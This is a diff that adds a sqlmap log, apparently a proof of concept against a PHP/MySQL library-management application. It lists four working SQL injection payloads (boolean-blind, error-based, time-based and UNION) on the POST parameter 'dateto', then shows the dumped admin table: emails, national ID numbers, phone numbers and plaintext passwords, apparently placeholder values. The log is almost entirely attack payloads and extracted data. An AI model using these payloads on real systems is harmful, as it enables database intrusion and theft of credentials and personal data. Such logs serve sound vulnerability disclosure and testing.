@@ -1,0 +1,32 @@
+sqlmap identified the following injection point(s) with a total of 336 HTTP(s) requests:
+---
+Parameter: dateto (POST)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
+    Payload: datefrom=2024-01-01&dateto=2024-12-31' AND 4929=(SELECT (CASE WHEN (4929=4929) THEN 4929 ELSE (SELECT 4122 UNION SELECT 4242) END))-- -&submit=1
+
+    Type: error-based
+    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
+    Payload: datefrom=2024-01-01&dateto=2024-12-31' AND EXTRACTVALUE(7909,CONCAT(0x5c,0x7178767871,(SELECT (ELT(7909=7909,1))),0x7176707871))-- IxcZ&submit=1
+
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: datefrom=2024-01-01&dateto=2024-12-31' AND (SELECT 1372 FROM (SELECT(!SLEEP(5)))NUOu)-- myvZ&submit=1
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 34 columns
+    Payload: datefrom=2024-01-01&dateto=2024-12-31' UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x7178767871,0x575666444f727668414e4c564b46655a47446a56665677555a41685a4252635a5963634764574d51,0x7176707871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- -&submit=1
+---
+web server operating system: Windows
+web application technology: PHP 8.0.30, Apache 2.4.58
+back-end DBMS: MySQL >= 5.1 (MariaDB fork)
+Database: project_library
+Table: admin
+[2 entries]
++----------+-----------------------+--------------+------------+----------+--------------+----------------+-----------+------------+------------+---------------------+-----------------------+------------------+
+| admin_id | email_id              | adhaar_id    | contact    | lastname | password     | username       | firstname | admin_type | middlename | admin_added         | admin_image           | confirm_password |
++----------+-----------------------+--------------+------------+----------+--------------+----------------+-----------+------------+------------+---------------------+-----------------------+------------------+
+| 1        | johndoe@example.com   | 123456789012 | 9876543210 | Doe      | admin123     | admin          | John      | Admin      | A.         | 2023-10-26 10:00:00 | avatar-366-456318.jpg | admin123         |
+| 2        | janesmith@example.com | 210987654321 | 9876543211 | Smith    | librarian123 | jane.librarian | Jane      | Librarian  | B.         | 2023-10-26 10:05:00 | user.png              | librarian123     |
++----------+-----------------------+--------------+------------+----------+--------------+----------------+-----------+------------+------------+---------------------+-----------------------+------------------+
+
